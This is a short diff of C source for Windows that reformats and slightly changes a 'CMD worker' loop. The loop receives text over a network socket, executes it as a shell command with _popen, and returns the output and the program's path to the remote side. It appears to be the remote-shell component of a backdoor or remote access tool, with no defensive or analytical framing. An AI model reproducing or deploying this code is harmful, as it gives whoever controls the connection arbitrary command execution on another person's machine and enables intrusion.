@@ -125,20 +125,23 @@ void CMDHelper(SOCKET clientSocket)
 
 //---------------------------------------------------------------- CMD WORKER----------------------------------------------------------------
 void handleCommand(SOCKET clientSocket) {
-    char buffer[BUFFER_SIZE] = {0};
+	char buffer[BUFFER_SIZE] = { 0 };
 
 	while (1) {
-        memset(buffer, 0, sizeof(buffer));
-        size_t bytes_received = recv(clientSocket, buffer, sizeof(buffer), 0);
-        if (bytes_received <= 0) {
-            break;
-        }
-		if (!strcmp(buffer, "QUIT")){
+		memset(buffer, 0, sizeof(buffer));
+		size_t bytes_received = recv(clientSocket, buffer, sizeof(buffer), 0);
+		if (bytes_received <= 0) {
+			break;
+		}
+
+		if (!strcmp(buffer, "QUIT")) {
 			sendData(clientSocket, "CMD Worker terminated!");
-	 		break;
-		}	
-        if (strlen(buffer) > 0) {
-			FILE *cmd_output = _popen(buffer, "r");
+			break;
+		}
+
+		if (strlen(buffer) > 0) {
+			// Redirect the output to a pipe
+			FILE* cmd_output = _popen(buffer, "r");
 			if (cmd_output == NULL) {
 				perror("Command execution error");
 				exit(1);
@@ -147,7 +150,7 @@ void handleCommand(SOCKET clientSocket) {
 			char output_str[1024];
 			memset(output_str, 0, sizeof(output_str));
 			fread(output_str, 1, sizeof(output_str) - 1, cmd_output);
-			//pclose(cmd_output);
+			_pclose(cmd_output);
 
 			WCHAR cwd[MAX_PATH];
 			GetModuleFileNameW(NULL, cwd, MAX_PATH);
@@ -155,7 +158,6 @@ void handleCommand(SOCKET clientSocket) {
 			char response[BUFFER_SIZE + MAX_PATH];
 			snprintf(response, sizeof(response), "%s\nCurrent Directory: %ls $", output_str, cwd);
 			send(clientSocket, response, strlen(response), 0);
-			
 		}
 	}
 }
